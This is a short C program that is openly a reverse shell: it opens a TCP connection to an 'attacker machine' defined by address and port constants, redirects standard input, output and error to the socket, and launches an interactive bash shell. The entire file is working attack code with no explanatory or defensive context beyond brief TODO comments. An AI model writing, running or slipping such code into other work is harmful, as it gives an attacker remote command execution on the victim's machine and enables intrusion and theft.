#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>


#define REV_ADDR "127.0.0.1"
#define REV_PORT 5555

//TODO
//create the socket
//connect to the attacker machine


int main(){

    struct sockaddr_in attacker_addr;
    attacker_addr.sin_family = AF_INET;
    attacker_addr.sin_port = htons(REV_PORT);
    inet_aton(REV_ADDR,&attacker_addr.sin_addr.s_addr);


    int sockfd = socket(AF_INET,SOCK_STREAM,0);
    if(sockfd<0){
        printf("Error creating socket.\n");
        return 1;
    }
    
    int connection = connect(sockfd, (struct sockaddr *) &attacker_addr, sizeof(attacker_addr));

    if(connection<0){
        printf("Connection failed.\n");
        return 1;
    }

	for(int i = 0;i<3;i++){
		dup2(sockfd,i);
	}


    execve("/bin/bash",(char *[]){"/bin/bash","-i",NULL},NULL);


    close(sockfd);
    return 0;


}

